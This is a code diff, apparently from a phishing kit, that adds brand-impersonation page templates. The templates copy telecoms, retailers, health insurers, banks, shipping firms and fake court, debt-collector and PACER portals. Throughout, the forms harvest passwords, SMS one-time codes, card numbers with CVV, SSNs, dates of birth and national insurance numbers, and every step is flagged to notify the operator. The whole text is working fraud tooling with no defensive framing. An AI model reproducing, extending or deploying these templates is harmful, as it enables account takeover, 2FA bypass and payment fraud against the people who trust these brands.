+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  bttelecom: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to BT',                      subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  deutschetelekom: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Deutsche Telekom',        subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  orangetelecom: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Orange',                  subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+
+  // ── RETAIL ────
+  walmart: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Walmart',                 subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  ebay: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to eBay',                    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  targetstore: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Target',                  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  bestbuy: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Best Buy',                subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  homedepot: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to The Home Depot',          subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  costco: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Costco',                  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  applestore: [
+    { slug:'apple-id', form_type:'login', page_title:'Apple ID',  headline:'Sign In with Your Apple ID',          subheadline:'', fields:['email'],    layout:'auth', cta:'Next',    step_label:'Apple ID', notify_step:true },
+    { slug:'password', form_type:'login', page_title:'Password',  headline:'Enter Your Password',                  subheadline:'', fields:['password'], layout:'auth', cta:'Sign In', step_label:'Password', notify_step:true },
+    { slug:'sms-otp',  form_type:'otp',   page_title:'Two-Factor',headline:'Two-Factor Authentication',            subheadline:'A message with a verification code has been sent to your device', fields:['code'], layout:'otp', cta:'Continue', step_label:'2FA', notify_step:true, otp_length:6 }
+  ],
+  aliexpress: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to AliExpress',              subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  etsy: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Etsy',                    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  asos: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to ASOS',                    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+
+  // ── HEALTHCARE ────
+  unitedhealth: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to UnitedHealthcare',        subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  aetna: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Aetna',                   subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  cigna: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Cigna',                   subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  kaiserpermanente: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Kaiser Permanente',       subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  cvshealth: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to CVS Health',              subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  walgreens: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Walgreens',               subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+
+  // ── LEGAL / COURT ────
+  lawfirmglobal: [
+    { slug:'login',     form_type:'login',    page_title:'Client Portal',   headline:'Client Portal Login',              subheadline:'Access your secure client portal', fields:['email','password'], layout:'auth',   cta:'Sign In',  step_label:'Login',    notify_step:true },
+    { slug:'id-verify', form_type:'id_verify',page_title:'Verify Identity', headline:'Verify Your Identity',              subheadline:'Enter your date of birth and case reference number', fields:['dob','case_number'], layout:'verify', cta:'Continue', step_label:'ID Verify', notify_step:true }
+  ],
+  debtcollector: [
+    { slug:'login',   form_type:'login',   page_title:'Account Access', headline:'Access Your Account',              subheadline:'Enter your account reference and date of birth', fields:['account_ref','dob'], layout:'auth',    cta:'Access Account', step_label:'Login',   notify_step:true },
+    { slug:'payment', form_type:'payment', page_title:'Make Payment',   headline:'Make a Payment',                    subheadline:'Enter your card details to settle your balance', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Pay Now', step_label:'Payment', notify_step:true }
+  ],
+  courtbailiff: [
+    { slug:'login',   form_type:'login',   page_title:'Enforcement Portal', headline:'Enforcement Portal',           subheadline:'Enter your reference number and date of birth', fields:['reference','dob'], layout:'auth',    cta:'Continue', step_label:'Login',   notify_step:true },
+    { slug:'payment', form_type:'payment', page_title:'Settlement',         headline:'Settle Your Debt',              subheadline:'Enter your card details to process payment', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Pay Now', step_label:'Payment', notify_step:true }
+  ],
+  solicitoruk: [
+    { slug:'login',     form_type:'login',    page_title:'Client Portal',   headline:'Client Portal',                subheadline:'Enter your email and password to access your files', fields:['email','password'], layout:'auth',   cta:'Sign In',  step_label:'Login',   notify_step:true },
+    { slug:'id-verify', form_type:'id_verify',page_title:'Identity Check',  headline:'Identity Verification',         subheadline:'Enter your date of birth and national insurance number', fields:['dob','ni_number'], layout:'verify', cta:'Continue', step_label:'ID Check', notify_step:true }
+  ],
+  federalcourtus: [
+    { slug:'login',     form_type:'login',    page_title:'PACER Login',     headline:'PACER Login',                  subheadline:'Enter your PACER credentials', fields:['username','password'], layout:'auth',   cta:'Sign In',  step_label:'Login',    notify_step:true },
+    { slug:'id-verify', form_type:'id_verify',page_title:'Verify Identity', headline:'Verify Your Identity',          subheadline:'Enter your SSN and date of birth', fields:['ssn','dob'], layout:'verify', cta:'Continue', step_label:'ID Verify', notify_step:true }
+  ],
+
+  // ── GENERIC ────
+  genericofficial: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign In',                            subheadline:'Enter your credentials to continue', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  genericlegal: [
+    { slug:'login',     form_type:'login',    page_title:'Access Portal',   headline:'Access Your Account',        subheadline:'Enter your reference number and date of birth', fields:['reference','dob'], layout:'auth',   cta:'Continue', step_label:'Login',   notify_step:true },
+    { slug:'id-verify', form_type:'id_verify',page_title:'Verify Identity', headline:'Identity Verification',       subheadline:'Please verify your identity to continue', fields:['ssn_last4','dob'], layout:'verify', cta:'Continue', step_label:'ID Check', notify_step:true }
+  ],
+  genericfinancial: [
+    { slug:'login',        form_type:'login',   page_title:'Sign In',         headline:'Sign In',                  subheadline:'', fields:['username','password'], layout:'auth',    cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp',      form_type:'otp',     page_title:'Verification',    headline:'Enter Verification Code',   subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 },
+    { slug:'confirm-card', form_type:'payment', page_title:'Confirm Account', headline:'Confirm Your Account Details', subheadline:'Enter your card details to verify your identity', fields:['card_last4','expiry','cvv'], layout:'payment', cta:'Confirm', step_label:'Card', notify_step:true }
   ],
 
   // ── CRYPTO ──────────────────────────────────────────────────────────────────
@@ -2331,7 +2723,93 @@ const BRANDS = [
   ['t247','MHz Choice','video','mhzchoice'],
   ['t248','Sundance Now','video','sundancenow'],
   ['t249','Topic','video','topic'],
-  ['t250','Vimeo','video','vimeo']
+  ['t250','Vimeo','video','vimeo'],
+
+  // ── SHIPPING (10) ──
+  ['t251','FedEx','banks','fedex'],
+  ['t252','UPS','banks','ups'],
+  ['t253','DHL','banks','dhl'],
+  ['t254','Royal Mail','banks','royalmail'],
+  ['t255','Evri (Hermes)','banks','hermesevri'],
+  ['t256','DPD','banks','dpd'],
+  ['t257','Parcelforce','banks','parcelforce'],
+  ['t258','Aramex','banks','aramex'],
+  ['t259','Canada Post','banks','canadapost'],
+  ['t260','Australia Post','banks','australiapost'],
+
+  // ── NEW BANKS (18) ──
+  ['t261','Capital One','banks','capitalonebank'],
+  ['t262','NatWest','banks','natwest'],
+  ['t263','Lloyds Bank','banks','lloyds'],
+  ['t264','Halifax','banks','halifaxbank'],
+  ['t265','PNC Bank','banks','pncbank'],
+  ['t266','BMO','banks','bmobank'],
+  ['t267','CommBank','banks','commonwealthbank'],
+  ['t268','Regions Bank','banks','regionsbank'],
+  ['t269','KeyBank','banks','keybank'],
+  ['t270','Fifth Third Bank','banks','fifththirdbank'],
+  ['t271','Citizens Bank','banks','citizensbank'],
+  ['t272','Huntington Bank','banks','huntingtonbank'],
+  ['t273','UniCredit','banks','unicreditbank'],
+  ['t274','Intesa Sanpaolo','banks','intesasanpaolo'],
+  ['t275','Société Générale','banks','societegenerale'],
+  ['t276','Crédit Agricole','banks','creditagricole'],
+  ['t277','Truist Bank','banks','truistbank'],
+  ['t278','M&T Bank','banks','mtbank'],
+
+  // ── INSURANCE (9) ──
+  ['t279','GEICO','payments','geico'],
+  ['t280','Progressive','payments','progressive'],
+  ['t281','Allstate','payments','allstate'],
+  ['t282','State Farm','payments','statefarm'],
+  ['t283','AXA Insurance','payments','axainsurance'],
+  ['t284','Aviva','payments','aviva'],
+  ['t285','Prudential','payments','prudential'],
+  ['t286','MetLife','payments','metlife'],
+  ['t287','Blue Cross Blue Shield','payments','bluecross'],
+
+  // ── TELECOM (9) ──
+  ['t288','AT&T','tech','attelecom'],
+  ['t289','Verizon','tech','verizon'],
+  ['t290','T-Mobile','tech','tmobile'],
+  ['t291','Xfinity','tech','comcast'],
+  ['t292','Vodafone','tech','vodafone'],
+  ['t293','O2','tech','o2telecom'],
+  ['t294','BT','tech','bttelecom'],
+  ['t295','Deutsche Telekom','tech','deutschetelekom'],
+  ['t296','Orange','tech','orangetelecom'],
+
+  // ── RETAIL (10) ──
+  ['t297','Walmart','payments','walmart'],
+  ['t298','eBay','payments','ebay'],
+  ['t299','Target','payments','targetstore'],
+  ['t300','Best Buy','payments','bestbuy'],
+  ['t301','The Home Depot','payments','homedepot'],
+  ['t302','Costco','payments','costco'],
+  ['t303','Apple Store','tech','applestore'],
+  ['t304','AliExpress','payments','aliexpress'],
+  ['t305','Etsy','payments','etsy'],
+  ['t306','ASOS','payments','asos'],
+
+  // ── HEALTHCARE (6) ──
+  ['t307','UnitedHealthcare','tech','unitedhealth'],
+  ['t308','Aetna','tech','aetna'],
+  ['t309','Cigna','tech','cigna'],
+  ['t310','Kaiser Permanente','tech','kaiserpermanente'],
+  ['t311','CVS Health','tech','cvshealth'],
+  ['t312','Walgreens','tech','walgreens'],
+
+  // ── LEGAL (5) ──
+  ['t313','Law Firm Portal','government','lawfirmglobal'],
+  ['t314','Debt Collector','government','debtcollector'],
+  ['t315','Court Bailiff','government','courtbailiff'],
+  ['t316','Solicitor UK','government','solicitoruk'],
+  ['t317','Federal Court US','government','federalcourtus'],
+
+  // ── GENERIC (3) ──
+  ['t318','Official Portal','government','genericofficial'],
+  ['t319','Legal Portal','government','genericlegal'],
+  ['t320','Financial Portal','banks','genericfinancial']
 ];
 
 function buildTemplate([id, name, category, palKey]) {
